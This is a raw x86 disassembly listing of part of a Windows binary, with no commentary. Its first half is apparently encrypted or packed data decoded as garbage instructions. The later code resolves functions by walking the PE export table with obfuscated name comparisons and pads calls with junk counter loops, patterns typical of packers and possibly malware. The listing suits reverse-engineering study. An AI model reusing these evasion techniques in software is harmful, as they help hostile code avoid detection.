  40ff2a:	or     BYTE PTR [ecx-0x32],bh
  40ff2d:	jp     0x40ff41
  40ff2f:	mov    edx,0xaa71b5a0
  40ff34:	inc    ebp
  40ff35:	push   0xe282c573
  40ff3a:	popf   
  40ff3b:	repnz or esi,DWORD PTR [edi+0x3b]
  40ff3f:	adc    BYTE PTR [ecx],bh
  40ff41:	xchg   ebx,eax
  40ff42:	repnz and bl,BYTE PTR [ebp+ebp*2+0x41d58061]
  40ff4a:	push   0x3a
  40ff4c:	xor    al,0x45
  40ff4e:	ffree  st(5)
  40ff50:	mov    al,ds:0xf69bda12
  40ff55:	aad    0xb6
  40ff57:	add    al,0x35
  40ff59:	pop    esp
  40ff5a:	xchg   esi,eax
  40ff5b:	imul   ecx,DWORD PTR [edx-0x60be30d0],0xffffff8c
  40ff62:	xchg   esp,esp
  40ff64:	xor    al,0xa1
  40ff66:	gs stos DWORD PTR es:[edi],eax
  40ff68:	dec    ecx
  40ff69:	jb     0x40ff55
  40ff6b:	fist   DWORD PTR [eax+0x22]
  40ff6e:	cmp    ebp,DWORD PTR [esi]
  40ff70:	or     DWORD PTR [edx],edx
  40ff72:	dec    ebp
  40ff73:	or     eax,0x59fdac67
  40ff78:	setb   BYTE PTR [edx+ebp*8+0x42]
  40ff7d:	das    
  40ff7e:	sbb    eax,0xf7f202c2
  40ff83:	xchg   ebx,eax
  40ff84:	xchg   edx,eax
  40ff85:	aad    0xe5
  40ff87:	loopne 0x40fff2
  40ff89:	in     al,0x0
  40ff8b:	fadd   st(6),st
  40ff8d:	dec    edi
  40ff8e:	out    0x72,eax
  40ff90:	in     al,dx
  40ff91:	add    eax,0x5a0ddd0c
  40ff96:	inc    ebp
  40ff97:	cmc    
  40ff98:	daa    
  40ff99:	lds    ebx,FWORD PTR [ecx-0x26]
  40ff9c:	mov    cl,0x9f
  40ff9e:	leave  
  40ff9f:	pop    esp
  40ffa0:	xor    ch,BYTE PTR ds:[ebx+edi*8-0x2c4cdab]
  40ffa8:	icebp  
  40ffa9:	out    dx,al
  40ffaa:	cmp    eax,0x138735fc
  40ffaf:	in     eax,dx
  40ffb0:	stos   DWORD PTR es:[edi],eax
  40ffb1:	js     0x40ff3d
  40ffb3:	shl    ah,1
  40ffb5:	iret   
  40ffb6:	clc    
  40ffb7:	ins    DWORD PTR es:[edi],dx
  40ffb8:	test   al,0x6a
  40ffba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffbc:	xchg   edi,eax
  40ffbd:	test   BYTE PTR [edi],bh
  40ffbf:	mov    ecx,0xce82426
  40ffc4:	aas    
  40ffc5:	out    0xb3,eax
  40ffc7:	xchg   esi,eax
  40ffc8:	addr16 int3 
  40ffca:	or     al,0x76
  40ffcc:	jge    0x410011
  40ffce:	adc    esi,DWORD PTR [edx]
  40ffd0:	jp     0x40fff8
  40ffd2:	fisubr DWORD PTR [ebp+eiz*1-0xd]
  40ffd6:	cmp    BYTE PTR [ebx],al
  40ffd8:	mov    bl,0xdf
  40ffda:	pushf  
  40ffdb:	adc    DWORD PTR [ecx],esi
  40ffdd:	pushf  
  40ffde:	jno    0x40ffb1
  40ffe0:	fdiv   QWORD PTR [ebp+0x19]
  40ffe3:	add    ecx,DWORD PTR [edi]
  40ffe5:	xor    ah,cl
  40ffe7:	sbb    BYTE PTR [edx],0x33
  40ffea:	push   0x62
  40ffec:	dec    eax
  40ffed:	lahf   
  40ffee:	pop    es
  40ffef:	dec    ecx
  40fff0:	fisttp QWORD PTR [esi-0x9ad989b]
  40fff6:	push   0x6da39ced
  40fffb:	icebp  
  40fffc:	fsubr  DWORD PTR [ebx-0x13350804]
  410002:	outs   dx,DWORD PTR ss:[esi]
  410004:	sbb    eax,esp
  410006:	pusha  
  410007:	mov    eax,ds:0x181fa9b3
  41000c:	inc    esi
  41000d:	sbb    esi,DWORD PTR [esi-0x5c94dc39]
  410013:	sahf   
  410014:	(bad)  
  410015:	pop    ds
  410016:	adc    eax,0x798c165d
  41001b:	idiv   BYTE PTR [eax]
  41001d:	push   ebp
  41001e:	mov    edx,0x7c03afbc
  410023:	dec    ecx
  410024:	(bad)  
  410025:	cli    
  410026:	sub    al,BYTE PTR [ebx-0x9]
  410029:	lahf   
  41002a:	pop    ecx
  41002b:	je     0x41001b
  41002d:	sbb    al,0xc6
  41002f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410030:	out    0x2e,eax
  410032:	div    DWORD PTR [edi]
  410034:	(bad)  
  410035:	data16 aaa 
  410037:	imul   BYTE PTR [ebx-0x4d]
  41003a:	or     bh,cl
  41003c:	jo     0x40ffd4
  41003e:	and    eax,0xfe25b677
  410043:	mov    bl,0xb4
  410045:	jmp    0x6b4d:0x2c00029f
  41004c:	jmp    0xac12:0x7b991597
  410053:	(bad)  
  410054:	repnz inc esi
  410056:	cmp    DWORD PTR [edx],esp
  410058:	shl    dh,1
  41005a:	test   ebx,0xe4f3d69c
  410060:	jo     0x41001b
  410062:	sti    
  410063:	xchg   esi,eax
  410064:	int3   
  410065:	mov    dh,0xef
  410067:	xchg   esp,eax
  410068:	jge    0x4100be
  41006a:	(bad)  
  41006b:	(bad)  
  41006d:	pop    ebp
  41006e:	popa   
  41006f:	dec    ebx
  410070:	and    eax,ecx
  410072:	fstp   TBYTE PTR [eax-0x70]
  410075:	sub    al,BYTE PTR [ebx-0x4d]
  410078:	test   BYTE PTR [ebx],dh
  41007a:	mov    esi,0x7353e9e3
  41007f:	sti    
  410080:	ret    
  410081:	in     al,0xd2
  410083:	push   ebx
  410084:	loope  0x410063
  410086:	mov    cl,0xae
  410088:	outs   dx,BYTE PTR ds:[esi]
  410089:	sbb    al,0x47
  41008b:	mov    esi,esp
  41008d:	pop    edi
  41008e:	es dec esi
  410090:	repz (bad) 
  410092:	jmp    0x700ca02f
  410097:	jns    0x410043
  410099:	(bad)  
  41009b:	shl    BYTE PTR [ebx],0x95
  41009e:	clc    
  41009f:	and    eax,0xbece6638
  4100a4:	and    al,0xef
  4100a6:	sar    BYTE PTR [eax],0xa6
  4100a9:	fcomp  DWORD PTR [ebp-0x5f]
  4100ac:	(bad)  
  4100ad:	aam    0x4d
  4100af:	cld    
  4100b0:	xchg   ebp,eax
  4100b1:	cli    
  4100b2:	test   DWORD PTR [esi+esi*8-0x1a],0x16a01297
  4100ba:	mov    al,ds:0x53e0e702
  4100bf:	dec    BYTE PTR ds:0x7a19ef3e
  4100c5:	imul   edi,DWORD PTR [ebx],0x40
  4100c8:	arpl   ax,ax
  4100ca:	stos   BYTE PTR es:[edi],al
  4100cb:	enter  0x7472,0x7b
  4100cf:	and    al,ch
  4100d1:	add    DWORD PTR [eax],esp
  4100d3:	adc    ah,ch
  4100d5:	and    DWORD PTR [ecx-0x5a],0x36a0d443
  4100dc:	mov    dl,0x3b
  4100de:	xchg   edi,eax
  4100df:	and    al,0x76
  4100e1:	xchg   BYTE PTR [edi*8-0x310ee575],ah
  4100e8:	push   ebx
  4100e9:	lds    si,DWORD PTR [eax-0x5da1f396]
  4100f0:	push   eax
  4100f1:	push   ss
  4100f2:	(bad)  
  4100f3:	xchg   ebp,eax
  4100f4:	ins    BYTE PTR es:[edi],dx
  4100f5:	adc    dh,BYTE PTR [ecx*1+0x335ce933]
  4100fc:	in     eax,dx
  4100fd:	imul   ebp,DWORD PTR ds:0x8db9c33,0x8ded37e5
  410107:	not    DWORD PTR [eax-0x19fcef5e]
  41010d:	or     DWORD PTR [ebx+0x3f2e2c37],edx
  410113:	scas   al,BYTE PTR es:[edi]
  410114:	outs   dx,DWORD PTR ds:[esi]
  410115:	mov    DWORD PTR [edx+edi*4],0x5863ba7a
  41011c:	xor    al,0x1b
  41011e:	sti    
  41011f:	and    cl,BYTE PTR [ebp+0x2d]
  410122:	push   ecx
  410123:	or     al,0x7d
  410125:	mov    BYTE PTR [eax+edi*1+0x61],al
  410129:	mov    edx,0x16253c4c
  41012e:	pop    ds
  41012f:	inc    esp
  410130:	mov    cl,BYTE PTR [esi+ebx*8+0x62]
  410134:	rcr    dh,1
  410136:	addr16 xchg esi,eax
  410138:	add    BYTE PTR [edi],bl
  41013a:	dec    eax
  41013b:	cmp    ecx,DWORD PTR [esi-0x3]
  41013e:	pop    ecx
  41013f:	jb     0x41017d
  410141:	iret   
  410142:	shl    BYTE PTR [ebp-0x481b51a9],1
  410148:	mov    dl,0xad
  41014a:	adc    BYTE PTR [edi],bh
  41014c:	sbb    BYTE PTR [edi+0x4f],ah
  41014f:	(bad)  
  410150:	shr    esi,cl
  410152:	push   esp
  410153:	add    al,0x1c
  410155:	push   edx
  410156:	and    ebp,DWORD PTR [ebp+0x4ab78be9]
  41015c:	fimul  DWORD PTR ds:0x7283c31e
  410162:	scas   eax,DWORD PTR es:[edi]
  410163:	(bad)  
  410164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410165:	lea    edi,[edx+eiz*2]
  410168:	jmp    0x410103
  41016a:	pop    ebp
  41016b:	xchg   DWORD PTR [edi-0xe],edx
  41016e:	cmc    
  41016f:	ins    BYTE PTR es:[di],dx
  410171:	retf   0x482c
  410174:	arpl   WORD PTR [eax],ax
  410176:	cmp    eax,0x827af2a2
  41017b:	xchg   esp,eax
  41017c:	pop    es
  41017d:	scas   eax,DWORD PTR es:[edi]
  41017e:	ret    0x60bd
  410181:	cmp    dl,BYTE PTR [ebx]
  410183:	fnstenv [ecx-0x59]
  410186:	iret   
  410187:	adc    esp,edx
  410189:	clc    
  41018a:	mov    ah,BYTE PTR ds:0x849af491
  410190:	inc    ecx
  410191:	repnz sti 
  410193:	cmp    al,0x4d
  410195:	mov    dh,0xa5
  410197:	push   eax
  410198:	dec    eax
  410199:	in     al,dx
  41019a:	mov    ebp,0x9b2c64d5
  41019f:	sub    DWORD PTR [ebp+0x277fdf20],edx
  4101a5:	enter  0xac56,0x1f
  4101a9:	inc    ecx
  4101aa:	fld    DWORD PTR [ebx+eiz*8]
  4101ad:	mov    ebx,0x9bdf666a
  4101b2:	jbe    0x41014b
  4101b4:	jmp    0x4deb:0x4e37fd1a
  4101bb:	mov    bl,0x82
  4101bd:	scas   al,BYTE PTR es:[edi]
  4101be:	mov    WORD PTR [edi+0x35],ss
  4101c1:	cmp    ch,BYTE PTR [edi+0x728d8d4]
  4101c7:	sbb    eax,DWORD PTR [ecx]
  4101c9:	scas   al,BYTE PTR es:[edi]
  4101ca:	adc    al,0xf5
  4101cc:	arpl   WORD PTR [ebp+0x4e9f07a2],cx
  4101d2:	cmp    ebp,ebp
  4101d4:	stc    
  4101d5:	jo     0x410214
  4101d7:	shl    ah,0xbe
  4101da:	outs   dx,BYTE PTR ds:[esi]
  4101db:	icebp  
  4101dc:	xor    DWORD PTR [ebp+0x2f2063a0],esp
  4101e2:	add    edx,DWORD PTR [eax-0x51]
  4101e5:	xor    BYTE PTR [ebp+eiz*1+0x2],dl
  4101e9:	dec    edi
  4101ea:	shr    DWORD PTR [eax+eax*4],1
  4101ed:	mov    WORD PTR [edi],?
  4101ef:	mov    ebx,0x6e26f525
  4101f4:	pop    ebx
  4101f5:	push   0x61577cd
  4101fa:	test   DWORD PTR [ebx],0xabbf9d54
  410200:	dec    esi
  410201:	mov    dl,0xce
  410203:	inc    edx
  410204:	shr    esp,0x49
  410207:	dec    eax
  410208:	pop    ds
  410209:	dec    eax
  41020a:	std    
  41020b:	push   edx
  41020c:	clc    
  41020d:	add    cl,BYTE PTR [esi+0x6c]
  410210:	jae    0x4101a3
  410212:	sbb    al,0x26
  410214:	or     DWORD PTR [edx],esp
  410216:	ja     0x4101e5
  410218:	mov    eax,0x18ef1627
  41021d:	pop    ss
  41021e:	mov    esp,0xd8c9eb5
  410223:	retf   0xb4e2
  410226:	pop    edi
  410227:	arpl   cx,si
  410229:	cmp    DWORD PTR [edx+0x5a151ff1],eax
  41022f:	sub    ebx,ebp
  410231:	xchg   esp,eax
  410232:	aad    0x73
  410234:	fsubr  QWORD PTR [esi-0x1f]
  410237:	push   ebp
  410238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41023a:	jge    0x4101bd
  41023c:	cmp    eax,0xcf4b1a84
  410241:	inc    ebp
  410242:	aam    0x16
  410244:	xor    DWORD PTR [ebx-0x3da73380],eax
  41024a:	xchg   BYTE PTR [ecx-0x330ef5b4],dl
  410250:	push   eax
  410251:	mov    ecx,0xf0922701
  410256:	ins    BYTE PTR es:[edi],dx
  410257:	(bad)  
  410258:	or     eax,0x5c2b97fc
  41025e:	add    BYTE PTR [esi],ch
  410260:	sbb    esp,0x9a182bcc
  410266:	and    BYTE PTR [ebx],bh
  410268:	imul   BYTE PTR [ecx+edi*2-0x3f1325e9]
  41026f:	ret    0x7b07
  410272:	jmp    0x951cc032
  410277:	cmp    al,0x3d
  410279:	fs add al,0xc2
  41027c:	sbb    al,0x59
  41027e:	aad    0x72
  410280:	int3   
  410281:	ins    BYTE PTR es:[edi],dx
  410282:	neg    ch
  410284:	test   DWORD PTR [ebp+0x3b202484],eax
  41028a:	std    
  41028b:	dec    esi
  41028c:	aas    
  41028d:	xchg   edx,eax
  41028e:	pop    ecx
  41028f:	pusha  
  410290:	mov    eax,ds:0xa6198854
  410295:	icebp  
  410296:	les    edi,FWORD PTR cs:[esi]
  410299:	jbe    0x41030c
  41029b:	test   eax,0x31f460cd
  4102a0:	retf   0x9730
  4102a3:	jp     0x4102be
  4102a5:	dec    esi
  4102a6:	cmp    cl,ch
  4102a8:	ins    BYTE PTR es:[edi],dx
  4102a9:	call   0x49ac3c4c
  4102ae:	cmc    
  4102af:	adc    esp,DWORD PTR [edx-0x213f96a]
  4102b5:	scas   al,BYTE PTR es:[edi]
  4102b6:	add    eax,0xb9ba9e94
  4102bb:	inc    ebp
  4102bc:	mov    al,ds:0x6277fb4a
  4102c1:	(bad)  
  4102c2:	(bad)  
  4102c3:	icebp  
  4102c4:	ret    
  4102c5:	pop    esi
  4102c6:	mov    eax,0xd4eb7e5d
  4102cb:	mov    ecx,0x88d5de2f
  4102d0:	dec    edi
  4102d1:	and    ecx,0xffffffc0
  4102d4:	fwait
  4102d5:	out    0x23,al
  4102d7:	mov    ebp,0x7dc59522
  4102dc:	test   DWORD PTR [ebx+0x565c9129],0x7a0bde6f
  4102e6:	mov    dl,0x27
  4102e8:	and    BYTE PTR [ebx],ah
  4102ea:	bound  ebp,QWORD PTR [eax]
  4102ec:	mov    al,0x75
  4102ee:	popf   
  4102ef:	sbb    BYTE PTR [ebp+0x115d84de],al
  4102f5:	ins    DWORD PTR es:[edi],dx
  4102f6:	push   ebp
  4102f7:	rol    esp,cl
  4102f9:	pop    ecx
  4102fa:	fisttp WORD PTR ss:[edi+0x56a206cd]
  410301:	enter  0xdd41,0x80
  410305:	jnp    0x4102d4
  410307:	pop    ecx
  410308:	fadd   QWORD PTR [ecx+0x26]
  41030b:	jnp    0x4102ee
  41030d:	mov    eax,0x4ea69356
  410312:	sti    
  410313:	pop    edx
  410314:	mov    al,0x7c
  410316:	fwait
  410317:	and    al,0xae
  410319:	jecxz  0x41036c
  41031b:	adc    eax,0x2f87ad52
  410320:	cmc    
  410321:	pop    eax
  410322:	mov    ds:0x412c1584,eax
  410327:	out    dx,al
  410328:	xor    al,0x50
  41032a:	scas   al,BYTE PTR es:[edi]
  41032b:	sahf   
  41032c:	in     eax,dx
  41032d:	sbb    esp,DWORD PTR [eax]
  41032f:	pushf  
  410330:	aaa    
  410331:	(bad)  
  410333:	int3   
  410334:	mov    WORD PTR [esp+edi*2+0x3a01201c],es
  41033b:	push   ebx
  41033c:	shl    al,cl
  41033e:	hlt    
  41033f:	inc    ebp
  410340:	or     BYTE PTR [ecx+ecx*2],bh
  410343:	push   ebp
  410344:	js     0x410357
  410346:	gs in  eax,dx
  410348:	and    eax,0x1cb5b2bf
  41034d:	mov    ecx,0xe4b62e38
  410352:	cdq    
  410353:	je     0x410370
  410355:	adc    cl,ch
  410357:	add    ch,dh
  410359:	pop    ss
  41035a:	xchg   esp,eax
  41035b:	mov    esp,ebx
  41035d:	pop    esi
  41035e:	div    DWORD PTR [eax+0x61]
  410361:	pop    edi
  410362:	jl     0x4103d4
  410364:	sbb    bl,BYTE PTR [edi+0x8]
  410367:	dec    edx
  410368:	pop    es
  410369:	inc    ebp
  41036a:	fst    DWORD PTR ds:0x3b4bbb97
  410370:	add    BYTE PTR [eax],al
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d45c
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff32
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d570
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d45c
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ff61
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d45c
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d658
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
